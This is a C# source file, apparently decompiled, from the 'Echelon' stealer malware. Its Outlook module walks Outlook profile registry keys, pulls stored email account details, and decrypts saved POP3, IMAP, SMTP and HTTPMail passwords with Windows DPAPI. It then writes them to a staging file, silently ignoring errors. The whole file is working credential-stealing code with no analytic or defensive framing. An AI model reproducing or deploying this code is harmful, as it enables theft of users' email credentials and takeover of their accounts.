using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.Win32;

namespace Echelon.Stealer.EmailClients
{
	// Token: 0x0200001F RID: 31
	internal class Outlook
	{
		// Token: 0x06000078 RID: 120 RVA: 0x0001AC18 File Offset: 0x00018E18
		public static void GrabOutlook(string Echelon_Dir)
		{
			string str = "";
			string[] array = new string[]
			{
				"Software\\Microsoft\\Office\\15.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
				"Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
				"Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
				"Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\9375CFF0413111d3B88A00104B2A6676"
			};
			string[] clients = new string[]
			{
				"SMTP Email Address",
				"SMTP Server",
				"POP3 Server",
				"POP3 User Name",
				"SMTP User Name",
				"NNTP Email Address",
				"NNTP User Name",
				"NNTP Server",
				"IMAP Server",
				"IMAP User Name",
				"Email",
				"HTTP User",
				"HTTP Server URL",
				"POP3 User",
				"IMAP User",
				"HTTPMail User Name",
				"HTTPMail Server",
				"SMTP User",
				"POP3 Password2",
				"IMAP Password2",
				"NNTP Password2",
				"HTTPMail Password2",
				"SMTP Password2",
				"POP3 Password",
				"IMAP Password",
				"NNTP Password",
				"HTTPMail Password",
				"SMTP Password"
			};
			foreach (string path in array)
			{
				str += Outlook.Get(path, clients);
			}
			try
			{
				Directory.CreateDirectory(Echelon_Dir + Outlook.OutlookDir);
				File.WriteAllText(Echelon_Dir + Outlook.OutlookDir + "\\Outlook.txt", str + "\r\n");
			}
			catch
			{
			}
		}

		// Token: 0x06000079 RID: 121 RVA: 0x0001ADC4 File Offset: 0x00018FC4
		private static string Get(string path, string[] clients)
		{
			Regex regex = new Regex("^(?!:\\/\\/)([a-zA-Z0-9-_]+\\.)*[a-zA-Z0-9][a-zA-Z0-9-_]+\\.[a-zA-Z]{2,11}?$");
			Regex regex2 = new Regex("^([a-zA-Z0-9_\\-\\.]+)@([a-zA-Z0-9_\\-\\.]+)\\.([a-zA-Z]{2,5})$");
			string text = "";
			try
			{
				foreach (string text2 in clients)
				{
					try
					{
						object infoFromReg = Outlook.GetInfoFromReg(path, text2);
						if (infoFromReg != null && text2.Contains("Password") && !text2.Contains("2"))
						{
							text = string.Concat(new string[]
							{
								text,
								text2,
								": ",
								Outlook.Decrypt((byte[])infoFromReg),
								"\r\n"
							});
						}
						else if (!regex.IsMatch(infoFromReg.ToString()) && !regex2.IsMatch(infoFromReg.ToString()))
						{
							text = string.Concat(new string[]
							{
								text,
								text2,
								": ",
								Encoding.UTF8.GetString((byte[])infoFromReg).Replace(Convert.ToChar(0).ToString(), ""),
								"\r\n"
							});
						}
						else
						{
							text += string.Format("{0}: {1}\r\n", text2, infoFromReg);
						}
					}
					catch
					{
					}
				}
				foreach (string str in Registry.CurrentUser.OpenSubKey(path, false).GetSubKeyNames())
				{
					text += Outlook.Get(path + "\\" + str, clients);
				}
			}
			catch
			{
			}
			return text;
		}

		// Token: 0x0600007A RID: 122 RVA: 0x0001AF84 File Offset: 0x00019184
		public static object GetInfoFromReg(string path, string valueName)
		{
			object result = null;
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(path, false);
				result = registryKey.GetValue(valueName);
				registryKey.Close();
			}
			catch
			{
			}
			return result;
		}

		// Token: 0x0600007B RID: 123 RVA: 0x0001AFC4 File Offset: 0x000191C4
		public static string Decrypt(byte[] encrypted)
		{
			try
			{
				byte[] array = new byte[encrypted.Length - 1];
				Buffer.BlockCopy(encrypted, 1, array, 0, encrypted.Length - 1);
				return Encoding.UTF8.GetString(ProtectedData.Unprotect(array, null, DataProtectionScope.CurrentUser)).Replace(Convert.ToChar(0).ToString(), "");
			}
			catch
			{
			}
			return "null";
		}

		// Token: 0x04000060 RID: 96
		public static string OutlookDir = "\\EmailClients\\Outlook";
	}
}
